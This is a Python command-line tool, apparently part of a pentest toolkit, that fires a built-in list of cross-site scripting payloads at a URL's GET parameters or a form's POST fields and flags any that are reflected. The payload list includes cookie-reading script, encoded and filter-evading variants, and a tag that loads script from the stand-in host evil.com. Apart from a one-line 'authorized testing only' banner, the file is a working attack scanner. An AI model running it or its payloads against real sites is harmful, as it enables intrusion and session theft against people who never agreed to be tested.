import requests
import os

GREEN = "\033[92m"; CYAN = "\033[96m"; YELLOW = "\033[93m"
RED = "\033[91m"; GRAY = "\033[90m"; RESET = "\033[0m"
BOLD = "\033[1m"; ACC = CYAN; BORDER = GREEN

PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
    "<a href=javascript:alert(1)>click</a>",
    "<details open ontoggle=alert(1)>",
    "<<script>alert(1)//<</script>",
    "<script>alert(document.cookie)</script>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script/src=//evil.com>",
    "';alert(1);//",
]

def test_xss_url(url):
    print(f"\n  {ACC}[*] Target: {url}{RESET}")
    print(f"  {ACC}[*] Testing {len(PAYLOADS)} XSS payloads...{RESET}\n")
    found = []

    for payload in PAYLOADS:
        test_url = url + requests.utils.quote(payload)
        try:
            r = requests.get(test_url, timeout=6,
                headers={"User-Agent": "Mozilla/5.0"})
            if payload.lower() in r.text.lower() or \
               payload in r.text:
                print(f"  {RED}[!] REFLECTED{RESET} {YELLOW}{payload[:40]}{RESET}")
                found.append(payload)
        except Exception as e:
            print(f"  {GRAY}[!] Error: {e}{RESET}")
            break

    if found:
        print(f"\n  {RED}[!] {len(found)} reflected XSS payloads found!{RESET}")
        print(f"  {GRAY}Note: Reflected ≠ exploitable — check browser manually.{RESET}")
    else:
        print(f"\n  {GREEN}[+] No reflected XSS detected.{RESET}")
        print(f"  {GRAY}Note: DOM-based/stored XSS requires manual testing.{RESET}")

def test_xss_form(url, params):
    print(f"\n  {ACC}[*] Testing form: {url}{RESET}\n")
    found = []

    for param in params:
        for payload in PAYLOADS[:10]:
            data = {p: "test" for p in params}
            data[param] = payload
            try:
                r = requests.post(url, data=data, timeout=6,
                    headers={"User-Agent": "Mozilla/5.0"})
                if payload in r.text:
                    print(f"  {RED}[!] REFLECTED in '{param}'{RESET} → {YELLOW}{payload[:40]}{RESET}")
                    found.append((param, payload))
            except Exception as e:
                print(f"  {GRAY}[!] Error: {e}{RESET}")
                break

    if not found:
        print(f"  {GREEN}[+] No reflected XSS detected in form.{RESET}")

def run_xss_tester():
    while True:
        print(f"""
{BORDER}{'─'*45}{RESET}
{ACC}{BOLD}  XSS TESTER{RESET}
{BORDER}{'─'*45}{RESET}
  {ACC}[1]{RESET} Test URL parameter (GET)
  {ACC}[2]{RESET} Test form fields (POST)
  {ACC}[b]{RESET} Back
{BORDER}{'─'*45}{RESET}
  {GRAY}For authorized testing only.{RESET}""")
        choice = input(f"  {ACC}[xss]>{RESET} ").strip().lower()

        if choice == "1":
            url = input(f"  {GRAY}Enter URL with param (e.g. http://site.com/search?q=): {RESET}").strip()
            if url: test_xss_url(url)

        elif choice == "2":
            url = input(f"  {GRAY}Enter form URL: {RESET}").strip()
            params = input(f"  {GRAY}Param names (comma separated): {RESET}").strip()
            if url and params:
                test_xss_form(url, [p.strip() for p in params.split(',')])

        elif choice == "b":
            break
        else:
            print(f"  {YELLOW}[!] Invalid option.{RESET}")
        input(f"\n  {GRAY}Press Enter to continue...{RESET}")
